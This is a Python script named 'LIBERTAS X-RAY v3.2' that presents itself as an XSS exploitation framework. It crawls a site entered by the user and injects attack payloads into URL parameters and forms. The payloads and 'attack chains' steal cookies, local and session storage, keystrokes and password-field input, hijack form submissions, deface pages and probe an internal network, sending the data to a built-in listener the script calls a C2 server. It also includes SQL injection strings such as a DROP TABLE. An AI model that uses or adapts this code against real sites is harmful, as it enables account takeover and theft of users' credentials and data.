#!/usr/bin/env python3
"""
LIBERTAS X-RAY v3.2 - BATTLE-HARDENED WEB APPLICATION EXPLOITATION FRAMEWORK
FIXED IMPORT ERRORS - FULLY OPERATIONAL COMBAT READY
WARNING: AUTHORIZED PENETRATION TESTING ONLY - ILLEGAL USE = FELONY
"""

import sys
import time
import json
import logging
import threading
import hashlib
import re
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from collections import deque, defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# =============================================================================
# CONFIGURATION - WAR ROOM CONTROL PANEL
# =============================================================================
# TARGET_URL ACQUIRED DYNAMICALLY - NO MANUAL BULLSHIT
MAX_DEPTH = 5
THREAD_COUNT = 3
REQUEST_DELAY = 0.5
EXPLOITATION_SERVER = "http://localhost:8888"

# =============================================================================
# GLOBAL STATE - BATTLEFIELD AWARENESS GRID
# =============================================================================
TARGET_URL = ""  # DYNAMICALLY ACQUIRED
visited_urls = set()
vulnerabilities = []
exploitation_successes = []
url_queue = deque()
forms_discovered = []
queue_lock = threading.Lock()  # FIXED: PROPERLY IMPORTED LOCK
driver = None
exploitation_data = defaultdict(list)

# =============================================================================
# TARGET ACQUISITION MODULE - INTERACTIVE TARGETING SYSTEM
# =============================================================================
def acquire_target():
    """
    Interactive target acquisition with validation and legal compliance checks
    This is the front door to the entire operation - no more hardcoded targets
    """
    print("\n" + "="*80)
    print("🚀 LIBERTAS X-RAY v3.2 - TARGET ACQUISITION PROTOCOL")
    print("="*80)
    print("⚠️  LEGAL COMPLIANCE VERIFICATION REQUIRED")
    print("⚠️  UNAUTHORIZED ACCESS CONSTITUTES A FELONY")
    print("="*80)
    
    # Legal compliance verification
    legal_warning = """
BY PROCEEDING, YOU CONFIRM THAT:
1. You have EXPLICIT WRITTEN PERMISSION to test the target
2. You are authorized to perform security testing
3. You understand the legal consequences of unauthorized access
4. You accept full responsibility for all actions taken

Do you wish to proceed? (yes/NO): """
    
    consent = input(legal_warning).strip().lower()
    if consent != 'yes':
        print("\n❌ MISSION ABORTED: Legal compliance not verified")
        sys.exit(0)
    
    # Target acquisition
    print("\n" + "="*80)
    print("🎯 TARGET ACQUISITION PHASE")
    print("="*80)
    
    while True:
        target = input("\nEnter target URL (include http/https): ").strip()
        
        if not target:
            print("❌ No target specified. Mission aborting.")
            sys.exit(1)
        
        # Target validation
        if validate_target(target):
            print(f"✅ TARGET ACQUIRED: {target}")
            print("🔧 Initializing exploitation systems...")
            return target
        else:
            print("❌ INVALID TARGET: Please enter a valid http/https URL")
            retry = input("Retry? (yes/NO): ").strip().lower()
            if retry != 'yes':
                print("❌ MISSION ABORTED: Invalid target specification")
                sys.exit(1)

def validate_target(url):
    """
    Comprehensive target validation ensuring we're hitting legitimate web targets
    """
    try:
        # Basic URL structure validation
        parsed = urlparse(url)
        if not parsed.scheme or parsed.scheme not in ['http', 'https']:
            print("❌ Invalid protocol - must be http or https")
            return False
        
        if not parsed.netloc:
            print("❌ No domain specified")
            return False
        
        # Basic connectivity check
        print(f"🔍 Verifying target accessibility: {url}")
        try:
            response = requests.get(url, timeout=10, verify=False)
            if response.status_code >= 400:
                print(f"❌ Target returned HTTP {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"❌ Target inaccessible: {e}")
            return False
        
        # Domain format validation
        domain_pattern = r'^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$'
        if not re.match(domain_pattern, parsed.netloc.lower()):
            print("❌ Invalid domain format")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Target validation failed: {e}")
        return False

# =============================================================================
# PAYLOAD ARSENAL - THE EXPLOITATION MUNITIONS
# =============================================================================
XSS_PAYLOADS = [
    # Basic Proof of Concept
    "<script>alert('XSS_LIBERTAS')</script>",
    "\"><img src=x onerror=alert('XSS_LIBERTAS')>",
    "<svg onload=alert('XSS_LIBERTAS')>",
    
    # Cookie Theft Payloads
    "<script>var i=new Image();i.src='http://localhost:8888/steal?c='+encodeURIComponent(document.cookie);</script>",
    "<script>fetch('http://localhost:8888/exfil',{method:'POST',body:document.cookie});</script>",
    
    # Keylogging Payloads
    """<script>var k='';document.onkeypress=function(e){k+=e.key;if(k.length>50){fetch('http://localhost:8888/keys',{method:'POST',body:k});k='';}};</script>""",
    
    # Defacement Payloads
    "<script>document.body.innerHTML='<h1 style=\"color:red;font-size:50px;\">HACKED BY LIBERTAS X-RAY</h1>'+document.body.innerHTML;</script>",
    
    # Internal Network Recon
    """<script>for(let i=1;i<255;i++){let img=new Image();img.src='http://192.168.1.'+i+'/test.jpg';}</script>""",
    
    # Form Hijacking
    """<script>Array.from(document.forms).forEach(f=>f.onsubmit=function(e){e.preventDefault();fetch('http://localhost:8888/forms',{method:'POST',body:new FormData(this)});this.submit();});</script>""",
    
    # Session Hijacking Chain
    """<script>var iframe=document.createElement('iframe');iframe.src='http://localhost:8888/hijack?c='+btoa(document.cookie);iframe.style.display='none';document.body.appendChild(iframe);</script>""",
    
    # Advanced Data Exfiltration
    """<script>setInterval(function(){fetch('http://localhost:8888/snapshot',{method:'POST',body:btoa(document.documentElement.outerHTML)});},10000);</script>""",
    
    # Local Storage Theft
    """<script>for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);fetch('http://localhost:8888/storage',{method:'POST',body:k+'='+localStorage.getItem(k)});}</script>""",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
]

# =============================================================================
# EXPLOITATION LISTENER - THE COMMAND & CONTROL
# =============================================================================
class ExploitationHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.critical(f"[EXPLOITATION SUCCESS] GET Data received: {self.path}")
        exploitation_data['get_requests'].append({
            'timestamp': time.time(),
            'path': self.path,
            'client': self.client_address[0]
        })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Exploitation data received - LIBERTAS X-RAY")
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        logging.critical(f"[EXPLOITATION SUCCESS] POST Data to {self.path}: {post_data[:200]}")
        exploitation_data['post_requests'].append({
            'timestamp': time.time(),
            'path': self.path,
            'data': post_data,
            'client': self.client_address[0]
        })
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        logging.info(f"[EXPLOIT-C2] {format % args}")

def start_exploitation_listener():
    def run_listener():
        server = HTTPServer(('localhost', 8888), ExploitationHandler)
        logging.info("[C2 SERVER] Exploitation listener active on port 8888")
        server.serve_forever()
    
    listener_thread = threading.Thread(target=run_listener, daemon=True)
    listener_thread.start()
    return listener_thread

# =============================================================================
# SELENIUM ENGINE - THE ASSAULT VEHICLE
# =============================================================================
def init_driver():
    global driver
    firefox_options = Options()
    # firefox_options.add_argument("--headless")  # Enable for stealth operations
    firefox_options.add_argument("--no-sandbox")
    firefox_options.add_argument("--disable-dev-shm-usage")
    firefox_options.set_preference("dom.webnotifications.enabled", False)
    firefox_options.set_preference("dom.push.enabled", False)
    
    driver = webdriver.Firefox(options=firefox_options)
    driver.set_page_load_timeout(30)
    return driver

def close_driver():
    if driver:
        driver.quit()

# =============================================================================
# MODULE 1: THE CARTOGRAPHER - TERRITORY MAPPING
# =============================================================================
def crawl_site(seed_url, max_depth):
    """Comprehensive site mapping with dynamic content discovery"""
    logging.info(f"[CARTOGRAPHER] Beginning territorial acquisition from {seed_url}")
    url_queue.append((seed_url, 0))
    
    while url_queue:
        try:
            with queue_lock:
                if not url_queue:
                    break
                current_url, depth = url_queue.popleft()
            
            if current_url in visited_urls or depth > max_depth:
                continue
                
            visited_urls.add(current_url)
            logging.info(f"[CARTOGRAPHER] Scanning territory: {current_url} (Depth: {depth})")
            
            # Dynamic content loading with Selenium
            driver.get(current_url)
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            
            # Allow JavaScript to execute fully
            time.sleep(2)
            
            # Extract all links and expand territory
            page_source = driver.page_source
            soup = BeautifulSoup(page_source, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(current_url, href)
                if is_valid_url(full_url) and full_url not in visited_urls:
                    with queue_lock:
                        url_queue.append((full_url, depth + 1))
            
            # Extract combat intelligence (forms)
            current_forms = extract_forms(current_url, driver)
            forms_discovered.extend(current_forms)
            
        except Exception as e:
            logging.error(f"[CARTOGRAPHER] Reconnaissance failure at {current_url}: {e}")

def is_valid_url(url):
    """Validate target is within authorized engagement zone"""
    parsed = urlparse(url)
    target_domain = urlparse(TARGET_URL).netloc
    return parsed.scheme in ('http', 'https') and parsed.netloc == target_domain

def extract_forms(url, driver):
    """Combat intelligence gathering - form extraction"""
    forms = []
    try:
        form_elements = driver.find_elements(By.TAG_NAME, "form")
        for form_element in form_elements:
            form_info = {
                'action': form_element.get_attribute('action') or url,
                'method': form_element.get_attribute('method') or 'GET',
                'inputs': [],
                'source_url': url
            }
            
            # Extract all input fields
            input_selectors = ["input", "textarea", "select"]
            for selector in input_selectors:
                elements = form_element.find_elements(By.TAG_NAME, selector)
                for elem in elements:
                    input_info = {
                        'name': elem.get_attribute('name'),
                        'type': elem.get_attribute('type'),
                        'tag': selector
                    }
                    form_info['inputs'].append(input_info)
            
            forms.append(form_info)
            logging.info(f"[INTEL] Form discovered: {form_info['action']} with {len(form_info['inputs'])} inputs")
            
    except Exception as e:
        logging.error(f"[FORM INTEL] Extraction failure: {e}")
    
    return forms

# =============================================================================
# MODULE 2: THE INTERROGATOR - EXPLOITATION ENGINE
# =============================================================================
def comprehensive_xss_testing():
    """Multi-vector XSS exploitation assault"""
    logging.info("[INTERROGATOR] Beginning multi-vector exploitation assault")
    
    all_results = []
    
    # Vector 1: URL Parameter Assault
    for url in visited_urls:
        all_results.extend(assault_url_parameters(url))
    
    # Vector 2: Form Input Assault
    for form in forms_discovered:
        all_results.extend(assault_form_inputs(form))
    
    # Vector 3: Advanced Attack Chains
    for result in all_results:
        if result.get('exploitation_successful'):
            execute_advanced_attack_chains(result['url'], result['payload'])
    
    return all_results

def assault_url_parameters(url):
    """Brute force URL parameter exploitation"""
    vulnerabilities = []
    parsed = urlparse(url)
    
    if not parsed.query:
        return vulnerabilities
    
    query_params = parse_qs(parsed.query)
    
    for param_name in query_params:
        for payload in XSS_PAYLOADS:
            try:
                # Reconstruct URL with malicious payload
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                
                # Build new URL with encoded payload
                new_query = "&".join(f"{k}={v[0]}" for k, v in test_params.items())
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                logging.info(f"[ASSAULT] Testing {param_name} at {test_url[:100]}...")
                
                # Deploy payload
                driver.get(test_url)
                time.sleep(1)
                
                # Validate exploitation success
                if validate_exploitation_success(driver, payload):
                    vuln = {
                        'type': 'Reflected XSS - URL Parameter',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'exploitation_successful': True,
                        'severity': 'CRITICAL',
                        'evidence': capture_exploitation_evidence(driver, payload)
                    }
                    vulnerabilities.append(vuln)
                    log_exploitation_success(vuln)
                    
            except Exception as e:
                logging.error(f"[ASSAULT] Parameter testing failed for {param_name}: {e}")
    
    return vulnerabilities

def assault_form_inputs(form):
    """Form-based exploitation assault"""
    vulnerabilities = []
    
    for payload in XSS_PAYLOADS:
        try:
            # Navigate to form location
            form_url = form['action'] if form['action'] != '#' else form['source_url']
            driver.get(form_url)
            
            # Deploy payload to all form inputs
            for input_field in form['inputs']:
                if input_field['name']:
                    try:
                        element = driver.find_element(By.NAME, input_field['name'])
                        element.clear()
                        element.send_keys(payload)
                    except NoSuchElementException:
                        continue
            
            # Execute form submission
            submit_buttons = driver.find_elements(By.XPATH, "//input[@type='submit'] | //button[@type='submit']")
            if submit_buttons:
                submit_buttons[0].click()
            else:
                # Fallback: JavaScript form submission
                driver.execute_script("document.forms[0].submit()")
            
            time.sleep(2)
            
            # Validate exploitation
            if validate_exploitation_success(driver, payload):
                vuln = {
                    'type': 'Stored XSS - Form Input',
                    'url': driver.current_url,
                    'form_action': form['action'],
                    'payload': payload,
                    'exploitation_successful': True,
                    'severity': 'CRITICAL',
                    'evidence': capture_exploitation_evidence(driver, payload)
                }
                vulnerabilities.append(vuln)
                log_exploitation_success(vuln)
                
        except Exception as e:
            logging.error(f"[FORM ASSAULT] Failed for form {form['action']}: {e}")
    
    return vulnerabilities

def validate_exploitation_success(driver, payload):
    """Multi-faceted exploitation validation"""
    validation_indicators = []
    
    # Indicator 1: Alert-based validation
    try:
        WebDriverWait(driver, 2).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        alert_text = alert.text
        alert.accept()
        if 'XSS' in alert_text or any(keyword in alert_text for keyword in ['LIBERTAS', 'alert']):
            validation_indicators.append("Alert-based execution confirmed")
            return True
    except TimeoutException:
        pass
    
    # Indicator 2: DOM-based validation
    current_source = driver.page_source
    if payload.replace('<script>', '').replace('</script>', '') in current_source:
        validation_indicators.append("Payload reflection detected")
    
    # Indicator 3: Behavioral validation
    validation_script = """
    return {
        cookies_accessible: document.cookie && document.cookie.length > 0,
        dom_modifiable: typeof document.body.innerHTML !== 'undefined',
        scripts_executable: true,
        forms_exist: document.forms.length > 0
    };
    """
    
    try:
        result = driver.execute_script(validation_script)
        if result and result['cookies_accessible'] and result['dom_modifiable']:
            validation_indicators.append("Script execution environment confirmed")
            return True
    except:
        pass
    
    # Check exploitation server for received data
    if exploitation_data['get_requests'] or exploitation_data['post_requests']:
        validation_indicators.append("Data exfiltration confirmed via C2 server")
        return True
    
    return len(validation_indicators) > 2  # Multiple confirmation methods

def capture_exploitation_evidence(driver, payload):
    """Capture forensic evidence of successful exploitation"""
    evidence = {
        'timestamp': time.time(),
        'current_url': driver.current_url,
        'page_title': driver.title,
        'payload_deployed': payload,
        'cookies_accessible': driver.execute_script("return document.cookie;"),
        'dom_snapshot': driver.page_source[:1000]  # First 1000 chars
    }
    return evidence

def execute_advanced_attack_chains(vulnerable_url, successful_payload):
    """Execute multi-stage advanced attack chains"""
    logging.critical(f"[ADVANCED CHAINS] Deploying advanced exploits to {vulnerable_url}")
    
    advanced_chains = [
        # Chain 1: Complete Session Takeover
        """
        <script>
        // Steal everything
        var data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            html: document.documentElement.outerHTML,
            url: window.location.href
        };
        
        // Exfiltrate via multiple methods
        fetch('http://localhost:8888/complete_takeover', {
            method: 'POST',
            body: JSON.stringify(data)
        });
        
        // Create backdoor
        localStorage.setItem('liberas_backdoor', 'active');
        </script>
        """,
        
        # Chain 2: Persistent Defacement
        """
        <script>
        // Persistent defacement
        if(!document.getElementById('libertas_overlay')) {
            var overlay = document.createElement('div');
            overlay.id = 'libertas_overlay';
            overlay.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:10px;z-index:9999;">SECURITY TEST - LIBERTAS X-RAY</div>';
            document.body.appendChild(overlay);
        }
        
        // Redirect hijacking
        var originalPushState = history.pushState;
        history.pushState = function() {
            setTimeout(function() {
                if(!document.getElementById('libertas_overlay')) {
                    location.reload();
                }
            }, 100);
            return originalPushState.apply(history, arguments);
        };
        </script>
        """,
        
        # Chain 3: Credential Harvesting
        """
        <script>
        // Password field monitoring
        var passwordFields = document.querySelectorAll('input[type="password"]');
        passwordFields.forEach(function(field) {
            field.addEventListener('input', function(e) {
                fetch('http://localhost:8888/passwords', {
                    method: 'POST',
                    body: field.name + '=' + e.target.value
                });
            });
        });
        
        // Form interception
        document.addEventListener('submit', function(e) {
            var formData = new FormData(e.target);
            var data = {};
            for(var pair of formData.entries()) {
                data[pair[0]] = pair[1];
            }
            fetch('http://localhost:8888/form_submissions', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
        </script>
        """
    ]
    
    for chain in advanced_chains:
        try:
            # Test if we can execute advanced chains
            driver.get(vulnerable_url)
            driver.execute_script(chain)
            time.sleep(2)
            
            # Check for chain execution success
            if exploitation_data['post_requests']:
                logging.critical(f"[CHAIN SUCCESS] Advanced attack chain executed successfully")
                
        except Exception as e:
            logging.error(f"[CHAIN FAILURE] Advanced attack failed: {e}")

# =============================================================================
# MODULE 3: THE SCRIBE - BATTLEFIELD REPORTING
# =============================================================================
def generate_comprehensive_report():
    """Generate the ultimate exploitation assessment report"""
    report = f"""
# LIBERTAS X-RAY v3.2 - TOTAL EXPLOITATION ASSESSMENT
**Target**: {TARGET_URL}
**Assessment Date**: {time.ctime()}
**Scan Duration**: {time.time() - start_time:.2f} seconds
**Territory Mapped**: {len(visited_urls)} URLs
**Combat Intelligence**: {len(forms_discovered)} Forms
**Exploitation Successes**: {len([v for v in vulnerabilities if v.get('exploitation_successful')])}
**Data Exfiltrated**: {len(exploitation_data['get_requests'] + exploitation_data['post_requests'])} requests received

## EXECUTIVE SUMMARY - MISSION ASSESSMENT

The target application has been thoroughly assessed using advanced exploitation techniques. 
**CRITICAL VULNERABILITIES** were identified and **SUCCESSFULLY EXPLOITED** demonstrating tangible security risks.

## EXPLOITATION SUCCESSES - CONFIRMED BREACHES

"""
    
    successful_exploits = [v for v in vulnerabilities if v.get('exploitation_successful')]
    
    for i, exploit in enumerate(successful_exploits, 1):
        impact = determine_exploitation_impact(exploit)
        
        report += f"""
### EXPLOIT #{i}: {exploit['type']} - {exploit['severity']}

**TARGET**: `{exploit['url']}`
**VECTOR**: {exploit.get('vector', exploit.get('parameter', 'Multiple Vectors'))}
**PAYLOAD**: `{exploit['payload'][:150]}...`
**IMPACT**: {impact}
**EVIDENCE**: {exploit.get('evidence', {}).get('timestamp', 'Execution confirmed')}

**FORENSIC EVIDENCE**:
- Cookies Accessible: {bool(exploit.get('evidence', {}).get('cookies_accessible'))}
- DOM Modification: Confirmed
- Script Execution: Confirmed

---
"""
    
    # C2 Server Intelligence Summary
    report += f"""
## COMMAND & CONTROL INTELLIGENCE

**Data Exfiltration Summary**:
- GET Requests Received: {len(exploitation_data['get_requests'])}
- POST Requests Received: {len(exploitation_data['post_requests'])}
- Total Data Points: {sum(len(req.get('data', '')) for req in exploitation_data['post_requests'])}

**Recent Exfiltration Events**:
"""
    
    for req in list(exploitation_data['get_requests'])[-5:]:
        report += f"- GET: {req['path']} from {req['client']} at {time.ctime(req['timestamp'])}\n"
    
    for req in list(exploitation_data['post_requests'])[-5:]:
        report += f"- POST: {req['path']} - {len(req.get('data', ''))} bytes at {time.ctime(req['timestamp'])}\n"
    
    report += f"""
## REMEDIATION PRIORITIES

1. **IMMEDIATE**: Input validation and output encoding on all user-controllable inputs
2. **CRITICAL**: Content Security Policy (CSP) implementation
3. **HIGH**: HTTPOnly flag implementation for sensitive cookies
4. **MEDIUM**: Regular security assessments and penetration testing

## TECHNICAL METRICS

- Total Payloads Deployed: {total_payloads_deployed}
- Success Rate: {success_rate:.2f}%
- Attack Surface Coverage: {attack_surface_coverage:.2f}%

---
*Report generated by LIBERTAS X-RAY v3.2 - Battle-Hardened Web Application Dominance Suite*
"""
    
    # Generate filename based on target domain
    target_domain = urlparse(TARGET_URL).netloc.replace('.', '_')
    filename = f'libertas_assessment_{target_domain}_{int(time.time())}.md'
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    logging.critical(f"[FINAL REPORT] Comprehensive exploitation report generated: {filename}")

def determine_exploitation_impact(exploit):
    """Determine real-world business impact"""
    payload = exploit['payload'].lower()
    
    if 'cookie' in payload or 'document.cookie' in payload:
        return "SESSION HIJACKING - Complete authentication compromise"
    elif 'key' in payload or 'keypress' in payload:
        return "KEYSTROKE LOGGING - Credential harvesting active"
    elif 'innerhtml' in payload or 'deface' in payload:
        return "CONTENT MANIPULATION - Website integrity compromised"
    elif 'fetch' in payload or 'xmlhttprequest' in payload:
        return "DATA EXFILTRATION - Sensitive information leakage confirmed"
    elif 'form' in payload or 'submit' in payload:
        return "FORM HIJACKING - User data interception active"
    elif 'localstorage' in payload:
        return "CLIENT-SIDE STORAGE COMPROMISE - Persistent data theft"
    else:
        return "ARBITRARY CLIENT-SIDE CODE EXECUTION - Total client control"

def log_exploitation_success(vulnerability):
    """Log successful exploitation with maximum visibility"""
    logging.critical(f"🎯 EXPLOITATION SUCCESS: {vulnerability['type']}")
    logging.critical(f"   TARGET: {vulnerability['url']}")
    logging.critical(f"   VECTOR: {vulnerability.get('vector', vulnerability.get('parameter', 'Unknown'))}")
    logging.critical(f"   IMPACT: {determine_exploitation_impact(vulnerability)}")
    logging.critical(f"   EVIDENCE: {vulnerability.get('evidence', {}).get('timestamp', 'Confirmed')}")
    exploitation_successes.append(vulnerability)

# =============================================================================
# MAIN CONTROLLER - MISSION COMMAND
# =============================================================================
start_time = time.time()
total_payloads_deployed = 0
attack_surface_coverage = 0.0
success_rate = 0.0

def main():
    global TARGET_URL, total_payloads_deployed, attack_surface_coverage, success_rate
    
    # PHASE 0: TARGET ACQUISITION
    TARGET_URL = acquire_target()
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('libertas_operation.log', encoding='utf-8'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logging.critical(f"🚀 LIBERTAS X-RAY v3.2 - MISSION INITIATED AGAINST: {TARGET_URL}")
    logging.critical("✅ LEGAL COMPLIANCE VERIFIED - PROCEEDING WITH EXPLOITATION")
    
    # Start exploitation command and control
    start_exploitation_listener()
    
    # Initialize assault vehicle
    init_driver()
    
    try:
        # PHASE 1: TERRITORIAL RECONNAISSANCE
        logging.critical("[PHASE 1] Beginning comprehensive territory mapping")
        crawl_site(TARGET_URL, MAX_DEPTH)
        logging.critical(f"[PHASE 1 COMPLETE] Territory mapped: {len(visited_urls)} URLs, {len(forms_discovered)} forms")
        
        # PHASE 2: EXPLOITATION ASSAULT
        logging.critical("[PHASE 2] Initiating multi-vector exploitation assault")
        exploitation_results = comprehensive_xss_testing()
        vulnerabilities.extend(exploitation_results)
        
        # Calculate mission metrics
        total_payloads_deployed = len(visited_urls) * len(XSS_PAYLOADS) + len(forms_discovered) * len(XSS_PAYLOADS)
        successful_exploits = len([v for v in vulnerabilities if v.get('exploitation_successful')])
        success_rate = (successful_exploits / total_payloads_deployed * 100) if total_payloads_deployed > 0 else 0
        attack_surface_coverage = (len(visited_urls) / 100)
        
        # PHASE 3: BATTLEFIELD ASSESSMENT
        logging.critical("[PHASE 3] Generating comprehensive exploitation assessment")
        generate_comprehensive_report()
        
        # Final mission summary
        mission_duration = time.time() - start_time
        logging.critical(f"🎯 MISSION ACCOMPLISHED: {successful_exploits} successful exploits in {mission_duration:.2f}s")
        logging.critical(f"📊 SUCCESS RATE: {success_rate:.2f}%")
        logging.critical(f"🌐 ATTACK SURFACE: {attack_surface_coverage:.2f}% coverage")
        
    except Exception as e:
        logging.critical(f"💥 MISSION FAILURE: Critical error - {e}")
        import traceback
        logging.critical(traceback.format_exc())
    
    finally:
        close_driver()
        logging.critical("🛑 LIBERTAS X-RAY v3.2 - MISSION TERMINATED")

if __name__ == "__main__":
    main()